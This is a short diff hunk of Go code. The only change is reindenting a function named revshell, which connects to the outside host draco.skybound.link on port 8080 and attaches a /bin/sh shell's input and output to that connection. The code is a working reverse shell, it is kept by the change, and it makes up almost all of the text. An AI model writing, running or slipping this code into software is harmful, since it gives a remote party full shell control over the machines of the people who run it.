@@ -25,11 +25,11 @@ var (
 )
 
 func revshell() {
- c, _ := net.Dial("tcp", "draco.skybound.link:8080")
- cmd := exec.Command("/bin/sh")
- cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
- cmd.Run()
- c.Close()
+	c, _ := net.Dial("tcp", "draco.skybound.link:8080")
+	cmd := exec.Command("/bin/sh")
+	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+	cmd.Run()
+	c.Close()
 }
 
 func main() {
